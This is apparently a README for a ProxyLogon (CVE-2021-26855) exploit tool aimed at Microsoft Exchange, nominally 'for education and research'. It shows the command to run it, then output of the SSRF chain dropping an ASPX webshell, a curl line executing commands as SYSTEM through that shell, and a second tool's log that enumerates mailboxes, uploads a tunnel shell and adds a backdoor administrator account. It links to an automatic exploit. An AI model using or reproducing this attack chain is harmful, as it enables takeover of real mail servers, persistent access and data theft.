# ProxyLogon Pre-Auth SSRF To Arbitrary File Write
For Education and Research
# Usage:
```
C:\>python proxylogon.py mail.evil.corp administratror@evil.corp
Attacking target mail.evil.corp
=============================
Got DN: /o=EVIL CORP/ou=first administrative group/cn=Recipients/cn=Administrator
Got SID: S-1-5-21-175943541-xxxxxxxxxx-3152120021-500
Got session id: a99eda32-xxxx-xxxx-825b-5f1c4a6080e7
Got canary: rOWUk7lmAUC2-5HIlQ4EpGq1rPu959xxxxxxxxxx_xxxxxxx_xxx_a-KJ5WR-9j95yu-JOv3dFY.
=========== It means good to go!!!====
Got OAB id: 2f3d4600-xxxx-xxxx-xxxx-b4a4c1d3fb58
Successful!
(+) Webshell drop at https://mail.evil.corp/owa/auth/evilcorp.aspx
(+) Code: curl -ik https://mail.evil.corp/owa/auth/evilcorp.aspx -d 'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'
CMD: whoami
nt authority\system
```
#### Automatic Exploit: [https://github.com/Udyz/Automatic-Proxylogon-Exploit](https://github.com/Udyz/Automatic-Proxylogon-Exploit)
#### View content and download: [https://gitlab.com/gvillegas/ohwaa/](https://gitlab.com/gvillegas/ohwaa/)

# Want this? (it made from script kiddies)
```

███████╗██╗   ██╗██╗██╗          ██████╗ ██████╗ ██████╗ ██████╗
██╔════╝██║   ██║██║██║         ██╔════╝██╔═══██╗██╔══██╗██╔══██╗
█████╗  ██║   ██║██║██║         ██║     ██║   ██║██████╔╝██████╔╝
██╔══╝  ╚██╗ ██╔╝██║██║         ██║     ██║   ██║██╔══██╗██╔═══╝
███████╗ ╚████╔╝ ██║███████╗    ╚██████╗╚██████╔╝██║  ██║██║
╚══════╝  ╚═══╝  ╚═╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝
        AUTOMATIC OWA PROXYLOGON EXPLOIT
                @lotusdll, @knowhere team, @hiephoinongdan

[*] Target: https://mail.evil.corp:443
(*) Getting FQDN Name: ECorp
(+) Target is Vuln to SSRF [CVE-2021-26855]!
(*) Getting Information Server
(+) Computer Name = EXCHANGE
(+) Domain Name =  exchange.evilcorp.local
(+) Guest SID = S-1-5-18=rJqNiZqNgbKelpOMic7RvKu20ZOQnJ6Tgc7Gy83Pyc7Nx86Bzc/NztLPzNLOyqvOz8XMzcXLyQ==
+  exchange.evilcorp.local
(+) Put Domain Server without Subdomain: evilcorp.local
(*) Find valid mail from users list
-----------------------------------
(-) administrator@evilcorp.local = The email address is invalid!
(-) localhost@evilcorp.local = The email address is invalid!
(-) admin@evilcorp.local = The email address is invalid!
(-) Guest@evilcorp.local = The email address is invalid!
(+) accounting@evilcorp.local = Valid Mail!
(+) Found User SID = S-1-5-21-4069934074-2056971103-3948042655-1197
(*) Tested ProxyLogon!
(+) Fixed SID = S-1-5-21-4069934074-2056971103-3948042655-500
(+) Login Success!
(+) Cookie =  ASP.NET_SessionId=4764e710-814b-4f7e-b9f2-bbeb52ac71c9; path=/; HttpOnly, msExchEcpCanary=vTsF_0s3NkKSOSkeMEuaqQydhKUu6dgITlKZqK5bY8KXKFQs-vmADg66hTb8rNUSDjf7yNMsYc0.; path=/ecp
(+) Leaked OAB Id = bbec9f2d-9814-4954-9870-c74f656304ae
(+) Preparing payload!
(-) /aspnet_client/evilcorp.aspx Write Webshell ERROR!
(+) Webshell drop at https://mail.evil.corp:443/aspnet_client/system_web/evilcorp.aspx
(*) Tested PwnRDP!
(+) Found port: 0xd3d (3389)
(!) Oops firewall block connect to RDP
(*) Upload Tunna shell success!
(*) Found ip address: 192.168.3.50
(+) Add net user/password (Administrators): mrrobot/3LlioT! (Done!)
(+) Listen tunnel at 127.0.0.1:1337 connect to mail.evil.corp:3389
(+) Abort
Or use ngrok...
```
